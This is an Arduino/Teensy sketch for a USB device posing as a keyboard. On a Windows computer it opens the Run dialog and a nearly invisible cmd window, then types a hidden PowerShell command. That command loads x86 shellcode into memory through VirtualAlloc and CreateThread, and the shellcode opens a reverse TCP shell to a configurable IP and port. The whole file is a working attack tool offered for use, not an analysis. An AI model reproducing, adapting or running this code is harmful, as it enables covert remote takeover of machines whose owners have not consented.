// Replace the two variables below.
int ip[] = {192,168,1,1};
int port = 443;


// Set built-in LED pin number.
int ledPin = 13;

// Placeholder for ip/port configuration.
char net_info[] = "0x@@,0x@@,0x@@,0x@@,0x68,0x02,0x00,0x@@,0x@@,0x89,";

void setup()
{
    pinMode(ledPin, OUTPUT);
    digitalWrite(ledPin, HIGH);
    delay(500);
    digitalWrite(ledPin, LOW);

    // Wait for drivers to install.
    hurryUp();

    // This gets our shell.
    spawnReverseTCP();
}

void loop()
{
}


// Convert IP and port to hex form.
void parseNet()
{
    char hex[16] = {'0','1','2','3',
                    '4','5','6','7',
                    '8','9','a','b',
                    'c','d','e','f'};
    int i;
    for (i = 0; i < 4; ++i) {
        net_info[(i*5)+2] = hex[ip[i]/16];
        net_info[(i*5)+3] = hex[ip[i]%16];
    }
    net_info[37] = hex[(port / 256) / 16];
    net_info[38] = hex[(port / 256) % 16];
    net_info[42] = hex[(port % 256) / 16];
    net_info[43] = hex[(port % 256) % 16];
}

// Wait for the driver to finish installing.
void hurryUp()
{
    // Check if Caps Lock is controllable yet.
    boolean areWeThereYet = capsCheck();

    // Spam the shit out of it if not.
    while (areWeThereYet == capsCheck())
    {
        returnCode(1, 500);
        hitCaps();
    }
    hitCaps();
}

// Check if Caps Lock is on.
boolean capsCheck()
{
    if ((activeLEDs() & 2) == 2)
    {
        return true;
    }
    else
    {
        return false;
    }
}

// Return keyboard LED status.
unsigned int activeLEDs()
{
    return int(keyboard_leds);
}

void returnCode(unsigned int numBlinks, unsigned int halfDelay)
{
    unsigned int count=0;
    for(count = 0; count != numBlinks; count++)
    {
        digitalWrite(ledPin, HIGH);
        delay(halfDelay);
        digitalWrite(ledPin, LOW);
        delay(halfDelay);
    }
}

// Press the Caps Lock button.
void hitCaps()
{
    Keyboard.set_key1(KEY_CAPS_LOCK);
    Keyboard.send_now();
    delay(100);
    clearKeys();
}

// Empty the keystroke buffer.
void clearKeys()
{
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
}

// Turn off Caps Lock.
void killCaps()
{
    if (capsCheck())
    {
        hitCaps();
    }
}

// Start the real magic.
void spawnReverseTCP()
{
    killCaps();
    
    // Keyboard is ready.
    returnCode(1, 100);                                            
    
    // Open the Run dialog.
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
    Keyboard.set_key1(KEY_R);
    Keyboard.send_now();
    clearKeys();
    
    delay(1000);
    
    // Run is ready.
    returnCode(1, 100);
    
    // Start a super small cmd.exe prompt.
    Keyboard.print("cmd.exe /T:01 /K MODE CON: COLS=17 LINES=1");
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    clearKeys();
    
    // Give CMD some time to appear.
    delay(3000);
    
    // CMD is ready.
    returnCode(1, 100);
    
    // Set the Powershell path based on architecture.
    Keyboard.println("if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell) else ( set PWRSHLXDD=powershell )");
    
    // All systems are go.
    returnCode(1, 100);
    

    /* * * * * * * * * * * *
     *                     *
     *  Take the red pill. *
     *                     *
     * * * * * * * * * * * */

    Keyboard.print("%PWRSHLXDD% -nop -w hidden -c \"$1 = '$c = ''");
    Keyboard.print("[DllImport(\\\"kernel32.dll\\\")]public static ext");
    Keyboard.print("ern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwS");
    Keyboard.print("ize, uint flAllocationType, uint flProtect);[DllIm");
    Keyboard.print("port(\\\"kernel32.dll\\\")]public static extern In");
    Keyboard.print("tPtr CreateThread(IntPtr lpThreadAttributes, uint ");
    Keyboard.print("dwStackSize, IntPtr lpStartAddress, IntPtr lpParam");
    Keyboard.print("eter, uint dwCreationFlags, IntPtr lpThreadId);[Dl");
    Keyboard.print("lImport(\\\"msvcrt.dll\\\")]public static extern I");
    Keyboard.print("ntPtr memset(IntPtr dest, uint src, uint count);''");
    Keyboard.print(";$w = Add-Type -memberDefinition $c -Name \\\"Win3");
    Keyboard.print("2\\\" -namespace Win32Functions -passthru;[Byte[]]");
    Keyboard.print(";[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,");
    Keyboard.print("0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,");
    Keyboard.print("0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,");
    Keyboard.print("0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,");
    Keyboard.print("0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,");
    Keyboard.print("0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,");
    Keyboard.print("0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,");
    Keyboard.print("0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,");
    Keyboard.print("0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,");
    Keyboard.print("0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,");
    Keyboard.print("0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,");
    Keyboard.print("0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,");
    Keyboard.print("0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,");
    Keyboard.print("0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,");
    Keyboard.print("0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,");
    Keyboard.print("0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,");
    Keyboard.print("0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,");
    Keyboard.print("0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,");
    Keyboard.print("0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,");
    Keyboard.print("0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,");
    Keyboard.print(net_info);  // Print out required network information.
    Keyboard.print("0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,");
    Keyboard.print("0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,");
    Keyboard.print("0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,");
    Keyboard.print("0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,");
    Keyboard.print("0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,");
    Keyboard.print("0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,");
    Keyboard.print("0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,");
    Keyboard.print("0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,");
    Keyboard.print("0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0");
    Keyboard.print("x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0");
    Keyboard.print("x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);");
    Keyboard.print("$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$");
    Keyboard.print("i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){St");
    Keyboard.print("art-sleep 60};';$gq = [System.Convert]::ToBase64St");
    Keyboard.print("ring([System.Text.Encoding]::Unicode.GetBytes($1))");
    Keyboard.print(";if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot +");
    Keyboard.print(" \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\");
    Keyboard.print("powershell\\\";$cmd = \\\"-nop -noni -enc \\\";iex");
    Keyboard.print(" \\\" $x86 $cmd $gq\\\"}else{$cmd = \\\"-nop -noni");
    Keyboard.print(" -enc\\\";iex \\\" powershell $cmd $gq\\\";}\"");
    clearKeys();

    // Send the command.
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);
    clearKeys();
    
    // All done.
    returnCode(1, 1000);
}
